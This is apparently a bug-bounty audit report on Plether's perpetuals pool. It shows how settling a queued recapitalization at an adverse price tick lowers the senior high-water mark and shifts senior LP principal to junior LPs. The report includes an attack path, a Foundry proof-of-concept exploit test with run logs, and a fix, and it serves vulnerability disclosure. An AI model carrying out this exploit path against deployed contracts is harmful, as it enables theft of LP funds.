# \#99429 [SC-Low] A pending recapitalization settled at a transient adverse mark overwrites `seniorHighWaterMark`, permanently cutting senior LP principal and moving it to junior LPs and unassigned assets

**Submitted on Nov 13th 2026 at 16:28:31 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99429
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

After a heavy LP loss, the owner calls `CfdEngine.recapitalizePool` to restore senior LPs. The amount is only queued. It is routed at the next reconcile, **after** that reconcile has written the mark-to-market waterfall to storage. If the trader's unrealized gain at that tick is at least the senior's remaining principal, senior and junior principal are both `0` at that mark. The recap code then takes its "empty pool bootstrap" branch and **overwrites** `seniorHighWaterMark` with the recap amount. When the mark returns, senior is restored only up to this lower HWM. The rest of the senior's old principal goes to junior LPs and `unassignedAssets`. Anyone can pick that tick, because `settleLpEpoch` is permissionless. Even an honest exact-gap recap is affected.

### Vulnerability Details

**1. The recap is routed against a transient, mark-dependent state.**

`HousePool._reconcile` first plans and stores the mark-to-market waterfall, and only then routes the pending recap against that stored state:

```solidity
// packages/perps/src/HousePool.sol:1568-1585
HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(...); // MtM loss: junior first, then senior
...
@> _setWaterfallState(plan.state.waterfall);                 // S and J at the CURRENT mark
   unassignedAssets = plan.state.unassignedAssets;
...
// :1597
@> _applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
```

`_applyPendingClaimantBucketsLive` (`HousePool.sol:1759-1776`) reads that just-written state through `_currentPendingAccountingState()` (`:1806-1817`) and routes the recap.

**2. The bootstrap branch overwrites the existing HWM.**

```solidity
// packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:117-122
if (state.seniorSupply > 0) {
@>  if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
@>      state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    } else { /* restore up to the existing HWM, rest -> unassigned */ }
}
```

This branch is meant for a truly empty senior tranche. Here `S == 0` is true only at a transient mark: a live trader gain `G >= S_old` has wiped it on paper. With an honest exact-gap recap `R = HWM_old - S_old`, the new HWM becomes `R`. Senior's surviving `S_old` drops out of its entitlement **for good**. Afterward `S == HWM`, so senior looks unimpaired and no path restores it. When the mark returns, the waterfall (`HousePoolWaterfallAccountingLib.sol:140-159`) gives the recovery above the new HWM to junior, and to `unassignedAssets`.

**What the protocol promises:**
- `ACCOUNTING_SPEC.md:337` / `WHITEPAPER.md:635`: "Losses do not reduce the Senior high-water mark."
- `HousePoolPendingPreviewLib.sol:107`: "recapitalization never accrues to junior principal."
- `INTERNAL_ARCHITECTURE_MAP.md:75`: unassigned assets "cannot silently become windfall LP ownership."

**Attack path:**
1. The pool takes a heavy realized loss: `J = 0`, `S = S_old < HWM`. This is the normal state in which the owner recapitalizes.
2. The owner calls `recapitalizePool(HWM - S_old)`. The amount is queued until the next reconcile.
3. The attacker, a junior holder whose shares are worth `0` at `J = 0`, calls `requestRedeem`. The next epoch refunds this zero-value head as queue progress (`HousePool.sol:961-985`), which makes `settleLpEpoch` callable.
4. The attacker calls `OrderRouter.settleLpEpoch` (`OrderRouter.sol:479`) at a valid tick where the open trader gain is `G >= S_old`. Reconcile writes `S = J = 0`. The bootstrap branch then sets `HWM = R`.
5. The mark returns. Senior is capped at the new, lower HWM, and the difference goes to junior and unassigned.

### Impact Details

Broken invariant: **an existing senior HWM is never reduced by a loss, and recap never accrues to junior.**

Measured in the PoC. `totalAssets` is identical in the control and the attack. Control = the same recap settled at the entry mark.

| PoC | Setup | Senior principal / HWM | Junior | Unassigned |
|---|---|---|---|---|
| `settleLpEpoch` path | S_old 20k, HWM 100.07k, recap 80.07k, tick 0.75 | **−20,000 / −20,000** | +2,500 | +17,500 |
| Release params (maxSkewRatio 0.4) | S_old 10k, HWM 101k, recap 91k, **tick 0.97 (3%)** | **−10,000 / −10,000** | +8,000 | +2,000 |

- The loss to senior LPs equals their whole surviving principal `S_old`. It is permanent and invisible afterward, because `S == HWM`.
- Junior holders, including the attacker, gain part of it. The rest is stranded in `unassignedAssets`, which only the owner can assign.
- The attacker needs no capital at risk: their junior shares are already worth `0`.
- No attacker is required: the same result occurs whenever the first reconcile after a recap lands on an adverse tick.

Limits: the issue needs a prior heavy LP loss and an owner recap, both exceptional events. The owner cannot recap and settle atomically, because settlement needs a matured queue item.

### Mitigation

In `applyClaimantRecapitalizationIntent`, bootstrap (overwrite the HWM) only when `seniorHighWaterMark == 0`. If `seniorPrincipal == 0 && seniorHighWaterMark > 0`, treat it as impairment: restore up to the existing HWM and send the remainder to `unassignedAssets`. Also consider sizing the senior restoration from the waterfall state **before** this reconcile's mark-to-market loss, so that recap routing does not depend on the mark.

### References

- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:117-122`: bootstrap branch overwrites `seniorHighWaterMark`
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:104-107`: natspec ("recapitalization never accrues to junior principal")
- `packages/perps/src/HousePool.sol:1568-1585`: MtM waterfall planned and stored before recap routing
- `packages/perps/src/HousePool.sol:1597`, `:1759-1776`, `:1806-1817`: recap routed against the stored transient state
- `packages/perps/src/CfdEngine.sol:632-653`: `recapitalizePool` only queues the amount
- `packages/perps/src/OrderRouter.sol:479`: permissionless `settleLpEpoch`
- `packages/perps/ACCOUNTING_SPEC.md:337`, `packages/perps/WHITEPAPER.md:635`: losses do not reduce the senior HWM

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/poc/RecapRoutingTransientMark.t.sol`. It uses the repo's `BasePerpTest` fixture. Run:

```
forge test --root packages/perps --match-path test/perps/poc/RecapRoutingTransientMark.t.sol -vv
```

Each test snapshots state after the recap is queued. The control settles at the entry mark (`1.00`). The attack settles at an adverse tick, and then the mark returns to `1.00`. A realized LP loss is modeled by burning pool USDG.

- `RecapRoutingSettleLpEpochPoC`: production `HousePool.settleLpEpoch` entry (the call `OrderRouter.settleLpEpoch` makes through its keeper sidecar). The queue item is the attacker's zero-value junior redeem.
- `RecapRoutingReleaseParamsPoC`: release risk params. A 3% tick is enough.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// Shared helpers. Each test compares a control (recap settled at the entry mark) with the attack
/// (recap settled at an adverse transient mark, then the mark returns to entry).
abstract contract RecapRoutingBase is BasePerpTest {
    function _mark(uint256 price) internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

    function _rec() internal {
        vm.prank(address(juniorVault));
        pool.reconcile();
    }

    function _recap(uint256 amount) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount); // owner call: amount is only queued here
    }

    function _log(string memory tag) internal view {
        console2.log(tag);
        console2.log("  seniorPrincipal ", pool.seniorPrincipal());
        console2.log("  seniorHWM       ", pool.seniorHighWaterMark());
        console2.log("  juniorPrincipal ", pool.juniorPrincipal());
        console2.log("  unassignedAssets", pool.unassignedAssets());
        console2.log("  totalAssets     ", pool.totalAssets());
    }
}

/// 1) Production epoch-settlement entry (HousePool.settleLpEpoch, reached from OrderRouter.settleLpEpoch).
contract RecapRoutingSettleLpEpochPoC is RecapRoutingBase {
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 1e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// The router's keeper sidecar calls pool.settleLpEpoch with the price it verified; any caller may trigger it.
    function _settleAt(uint256 price) internal {
        _mark(price);
        vm.prank(address(router));
        pool.settleLpEpoch(price, vm.getBlockTimestamp());
    }

    function test_RecapBootstrapAtTransientWipe_ViaSettleLpEpoch() public {
        address alice = address(0xA11CE); // junior LP = attacker
        _fundJunior(alice, 10_000e6);
        vm.warp(vm.getBlockTimestamp() + 3 days); // past deposit cooldown
        _mark(1e8);

        address trader = address(0xBEEF);
        _fundTrader(trader, 50_000e6);
        _open(trader, CfdTypes.Side.LONG, 150_000e18, 20_000e6, 1e8);
        _rec();

        // Heavy realized LP loss: junior wiped, senior impaired (S = 20k, HWM ~100k).
        settlementToken.burn(address(pool), 190_000e6);
        _rec();
        _log("after realized loss");

        // Owner queues an honest exact-gap recap.
        uint256 gap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        _recap(gap);

        // Attacker's zero-value junior redeem is the queue item that makes settleLpEpoch callable.
        vm.startPrank(alice);
        juniorVault.requestRedeem(juniorVault.balanceOf(alice), alice, alice);
        vm.stopPrank();
        vm.warp((vm.getBlockTimestamp() / 1 hours + 2) * 1 hours);
        uint256 snap = vm.snapshotState();

        // Control: settle at the entry mark.
        _settleAt(1e8);
        _rec();
        _log("control: settled at 1.00");
        uint256 cS = pool.seniorPrincipal();
        uint256 cH = pool.seniorHighWaterMark();
        uint256 cJ = pool.juniorPrincipal();
        uint256 cA = pool.totalAssets();

        // Attack: settle at a transient adverse tick, then the mark returns.
        vm.revertToState(snap);
        _settleAt(0.75e8);
        _log("attack: settled at 0.75");
        _mark(1e8);
        _rec();
        _log("attack: mark back at 1.00");

        console2.log("senior principal lost", cS - pool.seniorPrincipal());
        console2.log("senior HWM lost      ", cH - pool.seniorHighWaterMark());
        console2.log("junior gained        ", pool.juniorPrincipal() - cJ);
        assertEq(pool.totalAssets(), cA, "same pool assets");
        assertLt(pool.seniorHighWaterMark(), cH, "HWM permanently lowered");
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "senior now looks unimpaired");
        assertGt(pool.juniorPrincipal(), cJ, "junior windfall");
    }
}

/// 2) Release risk params (maxSkewRatio 0.4e18), default fixture: 1M junior LP + seeds, plus a 100k senior LP.
contract RecapRoutingReleaseParamsPoC is RecapRoutingBase {
    function test_ReleaseParams_ExactRecapAtThreePercentTick_CutsSeniorHwm() public {
        _fundSenior(address(0xA11CE), 100_000e6);
        address trader = address(0xBEEF);
        _fundTrader(trader, 100_000e6);
        _open(trader, CfdTypes.Side.LONG, 400_000e18, 20_000e6, 1e8);
        _rec();

        // Heavy realized LP loss: S ~10k, J = 0.
        settlementToken.burn(address(pool), pool.totalAssets() - 10_000e6);
        _rec();
        _log("after realized loss");

        _recap(pool.seniorHighWaterMark() - pool.seniorPrincipal()); // honest exact-gap recap
        uint256 snap = vm.snapshotState();

        _mark(1e8);
        _rec();
        _log("control: settled at 1.00");
        uint256 cS = pool.seniorPrincipal();
        uint256 cH = pool.seniorHighWaterMark();
        uint256 cA = pool.totalAssets();

        vm.revertToState(snap);
        _mark(0.97e8); // 3% adverse tick
        _rec();
        _log("attack: settled at 0.97");
        _mark(1e8);
        _rec();
        _log("attack: mark back at 1.00");

        console2.log("senior principal lost", cS - pool.seniorPrincipal());
        console2.log("senior HWM lost      ", cH - pool.seniorHighWaterMark());
        assertEq(pool.totalAssets(), cA, "same pool assets");
        assertLt(pool.seniorHighWaterMark(), cH, "HWM permanently lowered");
        assertLt(pool.seniorPrincipal(), cS, "senior principal permanently lower");
    }
}
```

Result (actually run):

```
Ran 1 test for test/perps/poc/RecapRoutingTransientMark.t.sol:RecapRoutingSettleLpEpochPoC
[PASS] test_RecapBootstrapAtTransientWipe_ViaSettleLpEpoch() (gas: 3103766)
Logs:
  after realized loss
    seniorPrincipal  20000000000
    seniorHWM        100066667520
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      20000000000
  control: settled at 1.00
    seniorPrincipal  100066667520
    seniorHWM        100066667520
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      100066667520
  attack: settled at 0.75
    seniorPrincipal  62566667520
    seniorHWM        80066667520
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      100066667520
  attack: mark back at 1.00
    seniorPrincipal  80066667520
    seniorHWM        80066667520
    juniorPrincipal  2500000000
    unassignedAssets 17500000000
    totalAssets      100066667520
  senior principal lost 20000000000
  senior HWM lost       20000000000
  junior gained         2500000000

Ran 1 test for test/perps/poc/RecapRoutingTransientMark.t.sol:RecapRoutingReleaseParamsPoC
[PASS] test_ReleaseParams_ExactRecapAtThreePercentTick_CutsSeniorHwm() (gas: 2577195)
Logs:
  after realized loss
    seniorPrincipal  10000000000
    seniorHWM        101000018264
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      10000000000
  control: settled at 1.00
    seniorPrincipal  101000018264
    seniorHWM        101000018264
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      101000018264
  attack: settled at 0.97
    seniorPrincipal  89000018264
    seniorHWM        91000018264
    juniorPrincipal  0
    unassignedAssets 0
    totalAssets      101000018264
  attack: mark back at 1.00
    seniorPrincipal  91000018264
    seniorHWM        91000018264
    juniorPrincipal  8000000000
    unassignedAssets 2000000000
    totalAssets      101000018264
  senior principal lost 10000000000
  senior HWM lost       10000000000

Ran 2 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

